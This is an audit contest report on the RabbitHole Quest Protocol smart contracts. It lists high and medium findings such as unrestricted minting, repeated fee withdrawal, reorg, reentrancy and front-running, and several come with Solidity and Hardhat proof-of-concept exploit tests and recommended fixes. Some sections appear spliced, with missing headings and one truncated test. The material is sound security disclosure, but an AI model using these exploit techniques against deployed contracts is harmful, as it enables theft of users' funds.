# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit contest outlined in this document, C4 conducted an analysis of the RabbitHole Quest Protocol smart contract system written in Solidity. The audit contest took place between January 25â€”January 30 2023.

## Wardens

185 Wardens contributed reports to the RabbitHole Quest Protocol contest:

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61><br>
<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L47-L50>

Both `RabbitHoleReceipt` and `RabbitHoleTickets` contracts define a `mint` function that is protected by a `onlyMinter` modifier:

RabbitHoleReceipt:

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L98-L104>

```solidity
function mint(address to_, string memory questId_) public onlyMinter {
    _tokenIds.increment();
    uint newTokenID = _tokenIds.current();
    questIdForTokenId[newTokenID] = questId_;
    timestampForTokenId[newTokenID] = block.timestamp;
    _safeMint(to_, newTokenID);
}
```

RabbitHoleTickets:

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L83-L85>

```solidity
function mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {
    _mint(to_, id_, amount_, data_);
}
```

However, in both cases the modifier implementation is flawed as there isn't any check for a require or revert, the comparison will silently return false and let the execution continue:

```solidity
modifier onlyMinter() {
    msg.sender == minterAddress;
    _;
}
```

### Impact

Any account can mint any number of `RabbitHoleReceipt` and `RabbitHoleTickets` tokens.

This represents a critical issue as receipts can be used to claim rewards in quests. An attacker can freely mint receipt tokens for any quest to steal all the rewards from it.

### Proof of Concept

The following test demonstrates the issue.

```solidity
contract AuditTest is Test {
    address deployer;
    uint256 signerPrivateKey;
    address signer;
    address royaltyRecipient;
    address minter;
    address protocolFeeRecipient;

    QuestFactory factory;
    ReceiptRenderer receiptRenderer;
    RabbitHoleReceipt receipt;
    TicketRenderer ticketRenderer;
    RabbitHoleTickets tickets;
    ERC20 token;

    function setUp() public {
        deployer = makeAddr("deployer");
        signerPrivateKey = 0x123;
        signer = vm.addr(signerPrivateKey);
        vm.label(signer, "signer");
        royaltyRecipient = makeAddr("royaltyRecipient");
        minter = makeAddr("minter");
        protocolFeeRecipient = makeAddr("protocolFeeRecipient");

        vm.startPrank(deployer);

        // Receipt
        receiptRenderer = new ReceiptRenderer();
        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();
        receipt = RabbitHoleReceipt(
            address(new ERC1967Proxy(address(receiptImpl), ""))
        );
        receipt.initialize(
            address(receiptRenderer),
            royaltyRecipient,
            minter,
            0
        );

        // factory
        QuestFactory factoryImpl = new QuestFactory();
        factory = QuestFactory(
            address(new ERC1967Proxy(address(factoryImpl), ""))
        );
        factory.initialize(signer, address(receipt), protocolFeeRecipient);
        receipt.setMinterAddress(address(factory));

        // tickets
        ticketRenderer = new TicketRenderer();
        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();
        tickets = RabbitHoleTickets(
            address(new ERC1967Proxy(address(ticketsImpl), ""))
        );
        tickets.initialize(
            address(ticketRenderer),
            royaltyRecipient,
            minter,
            0
        );

        // ERC20 token
        token = new ERC20("Mock ERC20", "MERC20");
        factory.setRewardAllowlistAddress(address(token), true);

        vm.stopPrank();
    }
    
    function test_RabbitHoleReceipt_RabbitHoleTickets_AnyoneCanMint() public {
        address attacker = makeAddr("attacker");

        vm.startPrank(attacker);

        // Anyone can freely mint RabbitHoleReceipt
        string memory questId = "a quest";
        receipt.mint(attacker, questId);
        assertEq(receipt.balanceOf(attacker), 1);

        // Anyone can freely mint RabbitHoleTickets
        uint256 tokenId = 0;
        tickets.mint(attacker, tokenId, 1, "");
        assertEq(tickets.balanceOf(attacker, tokenId), 1);

        vm.stopPrank();
    }
}
```

### Recommendation

The modifier should require that the caller is the `minterAddress` in order to revert the call in case this condition doesn't hold.

```solidity
modifier onlyMinter() {
    require(msg.sender == minterAddress);
    _;
}
```

[rvierdiiev](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/23)*

The `withdrawFee` function present in the `Erc20Quest` contract can be used to withdraw protocol fees after a quest has ended, which are sent to the protocol fee recipient address:

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104>

```solidity
function withdrawFee() public onlyAdminWithdrawAfterEnd {
    IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());
}
```

This function doesn't provide any kind of protection and can be called multiple times, which will send more tokens than intended to the protocol fee recipient, stealing funds from the contract.

### Impact

The `withdrawFee` function can be called multiples after a quest has ended, potentially stealing funds from other people. The contract may have funds from unclaimed receipts (i.e. users that have completed the quest, redeemed their receipt but haven't claimed their rewards yet) and remaining tokens from participants who didn't complete the quest, which can be claimed back by the owner of the quest.

Note also that the `onlyAdminWithdrawAfterEnd` modifier, even though it indicates that an "admin" should be allowed to call this function, only validates the quest end time and fails to provide any kind of access control:

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L76-L79>

```solidity
modifier onlyAdminWithdrawAfterEnd() {
    if (block.timestamp < endTime) revert NoWithdrawDuringClaim();
    _;
}
```

This means that anyone could call this function, so even if the quest owner or the protocol fee recipient behave correctly, a griefer could potentially call this function right after the quest end time to remove all (or most) of the funds from the contract.

### Proof of Concept

In the following demonstration, the `withdrawFee` function is called multiple times by a bad actor to remove all tokens from the quest contract.

```solidity
contract AuditTest is Test {
    address deployer;
    uint256 signerPrivateKey;
    address signer;
    address royaltyRecipient;
    address minter;
    address protocolFeeRecipient;

    QuestFactory factory;

    RabbitHoleReceipt receipt;
    TicketRenderer ticketRenderer;
    RabbitHoleTickets tickets;
    ERC20 token;

    function setUp() public {
        deployer = makeAddr("deployer");
        signerPrivateKey = 0x123;
        signer = vm.addr(signerPrivateKey);
        vm.label(signer, "signer");
        royaltyRecipient = makeAddr("royaltyRecipient");
        minter = makeAddr("minter");
        protocolFeeRecipient = makeAddr("protocolFeeRecipient");

        vm.startPrank(deployer);

        // Receipt
        receiptRenderer = new ReceiptRenderer();
        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();
        receipt = RabbitHoleReceipt(
            address(new ERC1967Proxy(address(receiptImpl), ""))
        );
        receipt.initialize(
            address(receiptRenderer),
            royaltyRecipient,
            minter,
            0
        );

        // factory
        QuestFactory factoryImpl = new QuestFactory();
        factory = QuestFactory(
            address(new ERC1967Proxy(address(factoryImpl), ""))
        );
        factory.initialize(signer, address(receipt), protocolFeeRecipient);
        receipt.setMinterAddress(address(factory));

        // tickets
        ticketRenderer = new TicketRenderer();
        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();
        tickets = RabbitHoleTickets(
            address(new ERC1967Proxy(address(ticketsImpl), ""))
        );
        tickets.initialize(
            address(ticketRenderer),
            royaltyRecipient,
            minter,
            0
        );

        // ERC20 token
        token = new ERC20("Mock ERC20", "MERC20");
        factory.setRewardAllowlistAddress(address(token), true);

        vm.stopPrank();
    }

    function signReceipt(address account, string memory questId)
        internal
        view
        returns (bytes32 hash, bytes memory signature)
    {
        hash = keccak256(abi.encodePacked(account, questId));
        bytes32 message = ECDSA.toEthSignedMessageHash(hash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, message);
        signature = abi.encodePacked(r, s, v);
    }

    function claimReceipt(address account, string memory questId) internal {
        (bytes32 hash, bytes memory signature) = signReceipt(account, questId);
        vm.prank(account);
        factory.mintReceipt(questId, hash, signature);
    }
    
    function test_Erc20Quest_ProtocolFeeWithdrawMultipleTimes() public {
        address alice = makeAddr("alice");
        address attacker = makeAddr("attacker");

        uint256 startTime = block.timestamp + 1 hours;
        uint256 endTime = startTime + 1 hours;
        uint256 totalParticipants = 1;
        uint256 rewardAmountOrTokenId = 1 ether;
        string memory questId = "a quest";

        // create, fund and start quest
        vm.startPrank(deployer);

        Erc20Quest quest = Erc20Quest(
            factory.createQuest(
                address(token),
                endTime,
                startTime,
                totalParticipants,
                rewardAmountOrTokenId,
                "erc20",
                questId
            )
        );

        uint256 rewards = totalParticipants * rewardAmountOrTokenId;
        uint256 fees = (rewards * factory.questFee()) / 10_000;
        deal(address(token), address(quest), rewards + fees);
        quest.start();

        vm.stopPrank();

        // simulate at least one user claims a receipt
        claimReceipt(alice, questId);

        // simulate time elapses until the end of the quest
        vm.warp(endTime);

        // The following can be executed by attacker (griefer) or by the fee recipient
        vm.startPrank(attacker);

        uint256 protocolFee = quest.protocolFee();
        uint256 withdrawCalls = (rewards + fees) / protocolFee;

        for (uint256 i = 0; i < withdrawCalls; i++) {
            quest.withdrawFee();
        }

        // Fee recipient has 100% of the funds
        assertEq(token.balanceOf(protocolFeeRecipient), rewards + fees);
        assertEq(token.balanceOf(address(quest)), 0);

        vm.stopPrank();
    }
}
```

### Recommendation

Add a flag to the contract to indicate if protocol fees have been already withdrawn. Add a check to prevent the function from being called again.

# Medium Risk Findings (9)
## [[M-01] `QuestFactory` is suspicious of the reorg attack](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/661)
*Submitted by [V\_B](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/661)*

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L75><br>

The `createQuest` function deploys a quest contract using the `create`, where the address derivation depends only on the `QuestFactory` nonce.

At the same time, some of the chains (Polygon, Optimism, Arbitrum) to which the `QuestFactory` will be deployed are suspicious of the reorg attack.

*   <https://polygonscan.com/blocks_forked>

![](https://i.imgur.com/N8tDUVX.png)

Here you may be convinced that the Polygon has in practice subject to reorgs. Even more, the reorg on the picture is 1.5 minutes long. So, it is quite enough to create the quest and transfer funds to that address, especially when someone uses a script, and not doing it by hand.

Optimistic rollups (Optimism/Arbitrum) are also suspect to reorgs since if someone finds a fraud the blocks will be reverted, even though the user receives a confirmation and already created a quest.

### Attack Scenario

Imagine that Alice deploys a quest, and then sends funds to it. Bob sees that the network block reorg happens and calls `createQuest`. Thus, it creates `quest` with an address to which Alice sends funds. Then Alices' transactions are executed and Alice transfers funds to Bob's controlled quest.

### Impact

If users rely on the address derivation in advance or try to deploy the wallet with the same address on different EVM chains, any funds sent to the wallet could potentially be withdrawn by anyone else. All in all, it could lead to the theft of user funds.

### Recommended Mitigation Steps

Deploy the quest contract via `create2` with `salt` that includes `msg.sender` and `rewardTokenAddress_`.

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L219-L229><br>

After completing a task in the context of a quest, a user receives a signed hash that needs to be redeemed on-chain for a receipt that can later be claimed for a reward.

The receipt is minted in the `mintReceipt` function present in the `QuestFactory` contract:

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L219-L229>

```solidity
function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {
    if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();
    if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();
    if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();
    if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();

    quests[questId_].addressMinted[msg.sender] = true;
    quests[questId_].numberMinted++;
    emit ReceiptMinted(msg.sender, questId_);
    rabbitholeReceiptContract.mint(msg.sender, questId_);
}
```

This function doesn't check if the quest has ended, and the hash doesn't contain any kind of deadline. A user may receive a signed hash and mint the receipt at any point in time.

The quest owner can withdraw remaining tokens after the quest end time using the `withdrawRemainingTokens` present in the quests contracts. This is the implementation for `Erc20Quest`:

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L81-L87>

```solidity
function withdrawRemainingTokens(address to_) public override onlyOwner {
    super.withdrawRemainingTokens(to_);

    uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;
    uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;
    IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);
}

function receiptRedeemers() public view returns (uint256) {
    return questFactoryContract.getNumberMinted(questId);
}
```

The function calculates how many receipts have been minted but are pending to be claimed, in order to leave the funds in the contract so the user can still claim those. However, this won't take into account receipts that are still pending to be minted.

### Impact

A user can mint the receipt for completing the task after the quest has ended, and in particular, if this is done after the owner of the quest has called `withdrawRemainingTokens`, then the user won't be able to claim the reward associated with that receipt.

This occurs because the user can mint the receipt after the quest end time, while the owner may have already withdrawn the remaining tokens, which only accounts for previously minted receipts.

Given this scenario, the user won't be able to claim the rewards, the contract won't have the required funds.

### Proof of Concept

In the following test, Alice mints her receipt after the quest owner has called `withdrawRemainingTokens`. Her call to `quest.claim()` will be reverted due to insufficient funds in the contract.

        factory.mintReceipt(questId, hash, signature);

        // The following will fail since there are no more rewards in the contract
        vm.expectRevert();
        quest.claim();

        vm.stopPrank();
    }
}
```

### Recommendation

Since tasks are verified off-chain by the indexer, given the current architecture it is not possible to determine on-chain how many tasks have been completed. In this case the recommendation is to prevent the minting of the receipt after the quest end time. This can be done in the `mintReceipt` by checking the `endTime` property which would need to be added to the `Quest` struct or by including it as a deadline in the signed hash.

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L99><br>
<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L117-L133>

`claim` function can be summaraized in next steps:

1.  Check that the quest is active
2.  Check the contract is not paused
3.  Get tokens corresponding to msg.sender for `questId` using `rabbitHoleReceiptContract.getOwnedTokenIdsOfQuest`: **DOS**
4.  Check that msg.sender owns at least one token
5.  Count non claimed tokens
6.  Check there is at least 1 unclaimed token
7.  Calculate redeemable rewards: `_calculateRewards(redeemableTokenCount);`
8.  Set all token to claimed state
9.  Update `redeemedTokens`
10. Emit claim event

The problem with this functions relays in its dependency on `RabbitHoleReceipt.getOwnedTokenIdsOfQuest`. It's behaviour can be summarized in next steps:

1.  Get queried balance (claimingAddress\_)
2.  Get claimingAddress\_ owned tokens
3.  Filter tokens corresponding to questId\_
4.  Return token of claimingAddress\_ corresponding to questId\_

If a user actively participates in multiple quests and accumulates a large number of tokens, the claim function may eventually reach the block gas limit. As a result, the user may be unable to successfully claim their earned tokens.

### Impact

It can be argued that function `ERC721.burn` can address the potential DOS risk in the claim process. However, it is important to note the following limitations and drawbacks associated with this approach:

1.  Utilizing `ERC721.burn` does not prevent the user from incurring network fees if a griefer, who has already claimed their rewards, sends their tokens to the user with the intent of causing a DOS and inducing loss of gas.
2.  If the user has not claimed any rewards from their accumulated tokens, they will still be forced to burn at least some of their tokens, resulting in a loss of these assets.

### Proof of Concept

**Griefing**

1.  Alice has took part in many quests, and want to recieve her rewards, so she call Quest.claim() function
2.  Bob also has already claimed many rewards from many quest, and decide to frontrun alice an send her all his tokens to DOS her
3.  Alice run out of gas, she lose transaction fees.

**Lose of unclaimed rewards**

1.  Alice always takes part in many quests, but never claims her rewards. She trusts RabbitHole protocol and is waiting to have much more rewards to claim in order to save some transaction fees.
2.  When Alice decide to call claim function she realizes that she has run out of gas.

Then, Alice can only burn some of her tokens to claim at least some rewards.

**Code**

[Code sample](https://gist.github.com/carlitox477/85e37d26c6f810304c849c93235ee99e)

### Recommended Mitigation steps

If a user can send a token list by parameter to claim function, then this vector attack can be mitigated.

To do this add next function to `RabbitHoleReceipt.sol`:

```solidity
function checkTokenCorrespondToQuest(uint tokenId, string memory questId_) external view returns(bool){
    return keccak256(bytes(questIdForTokenId[tokenId])) == keccak256(bytes(questId_));
}
```

Then modify `Quest.claim`:

```diff
// Quest.sol
-   function claim() public virtual onlyQuestActive {
+   function claim(uint[] memory tokens) public virtual onlyQuestActive {
        if (isPaused) revert QuestPaused();

-       uint[] memory tokens = rabbitHoleReceiptContract.getOwnedTokenIdsOfQuest(questId, msg.sender);

        // require(tokens.length > 0)
        if (tokens.length == 0) revert NoTokensToClaim();

        uint256 redeemableTokenCount = 0;
        for (uint i = 0; i < tokens.length; i++) {
            // Check that the token correspond to this quest
            require(rabbitHoleReceiptContract.checkTokenCorrespondToQuest(tokens[i],questId))

-           if (!isClaimed(tokens[i])) {
+           if (!isClaimed(tokens[i]) && rabbitHoleReceiptContract.checkTokenCorrespondToQuest(tokens[i],questId)) {
                redeemableTokenCount++;
            }
        }

        if (redeemableTokenCount == 0) revert AlreadyClaimed();

        uint256 totalRedeemableRewards = _calculateRewards(redeemableTokenCount);
        _setClaimed(tokens);
        _transferRewards(totalRedeemableRewards);
        redeemedTokens += redeemableTokenCount;

        emit Claimed(msg.sender, totalRedeemableRewards);
    }
```

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc1155Quest.sol#L60><br>
<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L114><br>

Unlike Erc20Quest.sol, owner of Erc1155Quest.sol is going to withdraw the remaining tokens from the contract when `block.timestamp == endTime` without deducting the `unclaimedTokens`. As a result, users will be denied of service when attempting to call the inherited `claim()` from Quest.sol.

### Proof of Concept

As can be seen from the code block below, when the Quest time has ended, `withdrawRemainingTokens()` is going to withdraw the remaining tokens from the contract on line 60:

[File: Erc1155Quest.sol#L52-L63](https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc1155Quest.sol#L52-L63)

```solidity
    /// @dev Withdraws the remaining tokens from the contract. Only able to be called by owner
    /// @param to_ The address to send the remaining tokens to
    function withdrawRemainingTokens(address to_) public override onlyOwner {
        super.withdrawRemainingTokens(to_);
        IERC1155(rewardToken).safeTransferFrom(
            address(this),
            to_,
            rewardAmountInWeiOrTokenId,
60:            IERC1155(rewardToken).balanceOf(address(this), rewardAmountInWeiOrTokenId),
            '0x00'
        );
    }
```

When a user tries to call `claim()` below, line 114 is going to internally invoke `_transferRewards()`:

[File: Quest.sol#L94-L118](https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L94-L118)

```solidity
    /// @notice Allows user to claim the rewards entitled to them
    /// @dev User can claim based on the (unclaimed) number of tokens they own of the Quest
    function claim() public virtual onlyQuestActive {
        if (isPaused) revert QuestPaused();

        uint[] memory tokens = rabbitHoleReceiptContract.getOwnedTokenIdsOfQuest(questId, msg.sender);

        if (tokens.length == 0) revert NoTokensToClaim();

        uint256 redeemableTokenCount = 0;
        for (uint i = 0; i < tokens.length; i++) {
            if (!isClaimed(tokens[i])) {
                redeemableTokenCount++;
            }
        }

        if (redeemableTokenCount == 0) revert AlreadyClaimed();

        uint256 totalRedeemableRewards = _calculateRewards(redeemableTokenCount);
        _setClaimed(tokens);
114:        _transferRewards(totalRedeemableRewards);
        redeemedTokens += redeemableTokenCount;

        emit Claimed(msg.sender, totalRedeemableRewards);
    }
```

`safeTransferFrom()` is going to revert on line 42 because the token balance of the contract is now zero. i.e. less than `amount_`:

```solidity
    /// @dev Transfers the reward token `rewardAmountInWeiOrTokenId` to the msg.sender
    /// @param amount_ The amount of reward tokens to transfer
    function _transferRewards(uint256 amount_) internal override {
42:        IERC1155(rewardToken).safeTransferFrom(address(this), msg.sender, rewardAmountInWeiOrTokenId, amount_, '0x00');
    }
```

### Recommended Mitigation Steps

Consider refactoring `withdrawRemainingTokens()` as follows:

(Note: The contract will have to separately import {QuestFactory} from './QuestFactory.sol' and initialize `questFactoryContract`.

```diff
+    function receiptRedeemers() public view returns (uint256) {
+        return questFactoryContract.getNumberMinted(questId);
+    }

    function withdrawRemainingTokens(address to_) public override onlyOwner {
        super.withdrawRemainingTokens(to_);

+        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens)
+        uint256 nonClaimableTokens = IERC1155(rewardToken).balanceOf(address(this), rewardAmountInWeiOrTokenId) - unclaimedTokens;
        IERC1155(rewardToken).safeTransferFrom(
            address(this),
            to_,
            rewardAmountInWeiOrTokenId,
-            IERC1155(rewardToken).balanceOf(address(this), rewardAmountInWeiOrTokenId),
+            nonClaimableTokens,
            '0x00'
        );
    }
```

If the reward token is `erc1155/erc777`, an attacker can reenter and then buy/transfer another unclaimed token to the attacker address and then the var `redeemTokens` won't be equal to how many tokens were actually redeemed.

### Proof of Concept

**Example:**<br>
Reward token is an erc1155 that has  `_afterTokenTransfer`<br>
Alice(attacker) has 2 receipt tokens, the first one is on a smart contract that will do the reentrancy, and the second one is on Alice's address but is approved to transfer to the smart contract(the own that holds the first receipt)

1.  Alice calls the sc to `claim` rewards

```solidity
 IERC1155(rewardToken).safeTransferFrom(address(this), msg.sender, rewardAmountInWeiOrTokenId, amount_, '0x00');
```

2.  `_afterTokenTransfer`  which causes the sc to call a function in its fallback function that transfers the approved token to the sc

```solidity
   try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) {
```

3.  We then reenter with recipient, not yet claimed token and we claim it

**Result:**<br>
The invariant that `redeemedTokens` = tokens that are redeemed is false because it doesn't account for the first token that we reentered.<br>
The issue is worse  with `erc777` tokens because of  the fact  that accounting will be in  the `withdrawRemainingTokens` function

```solidity

        uint256 unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;
        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;
        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);

```

after the reentrancy<br>
ex: `redeemedTokens=9` but should be 10<br>
`receiptRedeemers()=12`<br>
`rewardAmountInWeiOrTokenId=1e5`<br>
`unclaimedTokens=300000`<br>
assuming they are some tokens left<br>
`balance(address(this)=201000` and `protocolFee=500`<br>
`nonClaimableTokens=201000 - 500 - 300000` it would revert ( negative numbers  with uint) and   funds would be stuck in the contract forever<br>
The real estimate for `nonClaimableTokens=201000-500-200000=500` and the owner can get funds out
but 500 wei will be lost in the contract<br>
and  it can get worse with large amounts of quests and the attacker reentering multiple times to cause a bigger gap between the real `redeemedTokens`

### Recommended Mitigation Steps

Add nonReentrancy modifier

Might be impossible to claim rewards by users. And admins must distribute tokens manually and pay fee for this. On a huge amount of participants this leads to huge amount of fees.

### Proof of Concept

Let's consider `QuestFactory`. It has:

```solidity
    RabbitHoleReceipt public rabbitholeReceiptContract;
```

Which responsible for mint tokens for users.

Then consider `createQuest` function. Here we pass `rabbitholeReceiptContract` into `Quest`.

In `Quest` this field is immutable.

Now let's consider next case:

1.  We initialized whole contracts.
2.  We created new Quest.
3.  Next we decided to change `rabbitholeReceiptContract` in `QuestFactory` for another. To do this we call: `setRabbitHoleReceiptContract`. And successfully changing address.
4.  Next we distribute signatures to our participants.
5.  Users starts to mint tokens. But here is a bug `QuestFactory` storages new  address of `rabbitholeReceiptContract`, but `Quest` initialized with older one. So users successfully minted their tokens, but can't exchange them for tokens because the Quest's receipt contract know nothing about minted tokens.

Possible solution here is change `minterAddress` in the original `RabbitHoleReceipt` contract and manually mint tokens by admin, but it will be too expensive and the company may lost a lot of money.

### Recommended Mitigation Steps

In `QuestFactory` contract in the function `mintReceipt`  the rabbitholeReceiptContract must be fetched from the quest directly.

To `Quest` Add:

```solidity
function getRabbitholeReceiptContract() public view returns(RabbitHoleReceipt) {
    return rabbitHoleReceiptContract;
}
```

Modify `mintReceipt` function in `QuestFactory` like:

```solidity
function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {
    ...
    RabbitHoleReceipt rabbitholeReceiptContract = Quest(quests[questId_].questAddress).getRabbitholeReceiptContract();
    rabbitholeReceiptContract.mint(msg.sender, questId_);
    ...
}
```

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L81-L87>

The contract `ERC20Quest.sol` has two functions of interest here. The first is `withdrawFee()`, which is responsible for transferring out the fee amount from the contract once endTime has been passed, and the second is `withdrawRemainingTokens()` which recovers the remaining tokens in the contract which haven't been claimed yet.

Function `withdrawRemainingTokens()`:

```solidity
function withdrawRemainingTokens(address to_) public override onlyOwner {
        super.withdrawRemainingTokens(to_);

        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;
        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;
        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);
    }
```

As evident from this excerpt, calling this recovery function subtracts the tokens which are already assigned to someone who completed the quest, and the fee, and returns the rest. However, there is no check for whether the fee has already been paid or not. The owner is expected to first call `withdrawRemainingTokens()`, and then call `withdrawFee()`.

However, if the owner calls `withdrawFee()` before calling the function `withdrawRemainingTokens()`, the fee will be paid out by the first call, but the same fee amount will still be kept in the contract after the second function call, basically making it unrecoverable. Since there are no checks in place to prevent this, this is classified as a high severity since it is an easy mistake to make and leads to loss of funds of the owner.

### Proof of Concept

This can be demonstrated with this test

```javascript
describe('Funds stuck due to wrong order of function calls', async () => {
    it('should trap funds', async () => {
      await deployedFactoryContract.connect(firstAddress).mintReceipt(questId, messageHash, signature)
      await deployedQuestContract.start()
      await ethers.provider.send('evm_increaseTime', [86400])
      await deployedQuestContract.connect(firstAddress).claim()

      await ethers.provider.send('evm_increaseTime', [100001])
      await deployedQuestContract.withdrawFee()
      await deployedQuestContract.withdrawRemainingTokens(owner.address)

      expect(await deployedSampleErc20Contract.balanceOf(deployedQuestContract.address)).to.equal(200)
      expect(await deployedSampleErc20Contract.balanceOf(owner.address)).to.be.lessThan(
        totalRewardsPlusFee * 100 - 1 * 1000 - 200
      )
      await ethers.provider.send('evm_increaseTime', [-100001])
      await ethers.provider.send('evm_increaseTime', [-86400])
    })
  })
```

Even though the fee is paid, the contract still retains the fee amount. The owner receives less than the expected amount. This test is a modification of the test `should transfer non-claimable rewards back to owner` already present in `ERC20Quest.spec.ts`.

### Tools Used

Hardhat

### Recommended Mitigation Steps

Only allow fee to be withdrawn after the owner has withdrawn the funds.

```solidity
// Declare a boolean to check if recovery happened
bool recoveryDone;

function withdrawRemainingTokens(address to_) public override onlyOwner {
        super.withdrawRemainingTokens(to_);

        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;
        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;
        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);
   
        // Set recovery bool
        recoveryDone = true;
    }
function withdrawFee() public onlyAdminWithdrawAfterEnd {
        // Check recovery
        require(recoveryDone,"Recover tokens before withdrawing Fees");
        IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());
    }
```

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L113>

Let us look closely into the `Quest.sol#claim` function

```solidity
/// @notice Allows user to claim the rewards entitled to them
/// @dev User can claim based on the (unclaimed) number of tokens they own of the Quest
function claim() public virtual onlyQuestActive {
	if (isPaused) revert QuestPaused();

	uint[] memory tokens = rabbitHoleReceiptContract.getOwnedTokenIdsOfQuest(questId, msg.sender);

	if (tokens.length == 0) revert NoTokensToClaim();

	uint256 redeemableTokenCount = 0;
	for (uint i = 0; i < tokens.length; i++) {
		if (!isClaimed(tokens[i])) {
			redeemableTokenCount++;
		}
	}

	if (redeemableTokenCount == 0) revert AlreadyClaimed();

	uint256 totalRedeemableRewards = _calculateRewards(redeemableTokenCount);
	_setClaimed(tokens);
	_transferRewards(totalRedeemableRewards);
	redeemedTokens += redeemableTokenCount;

	emit Claimed(msg.sender, totalRedeemableRewards);
}
```

After the NFT is used to claim, the \_setClaimed(token) is called to mark the NFT as used to prevent double claiming.

```solidity
/// @notice Marks token ids as claimed
/// @param tokenIds_ The token ids to mark as claimed
function _setClaimed(uint256[] memory tokenIds_) private {
	for (uint i = 0; i < tokenIds_.length; i++) {
		claimedList[tokenIds_[i]] = true;
	}
}
```

The NFT is also tradeable in the secondary marketplace. I would like to make a reasonable assumption that user wants to buy the NFT because they can use the NFT to claim the reward, which means after the reward is claimed, the NFT lose value.

Consider the case below:

1.  User A has 1 NFT, has he can use the NFT to claim 1 ETH reward.
2.  User A place a sell order in opensea and sell the NFT for 0.9 ETH.
3.  User B see the sell order and find it a good trae, he wants to buy the NFT.
4.  User B submit a buy order, User A at the same time submit the claimReward transaction.
5.  User A's transaction executed first, reward goes to User A, then User B transaction executed, NFT ownership goes to User B, but user B find out that the he cannot claim the reward becasue the reward is already claimed by User A.

User A can intentionally front-run User B's buy transaction by monitoring the mempool in polygon using the service

<https://www.blocknative.com/blog/polygon-mempool>

Or it could be just two users submit transactions at the same time and User A's claim transaction happens to execute first.

### Recommended Mitigation Steps

Disable NFT transfer and trade once the NFT is used to claim the reward.

<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L219-L229>

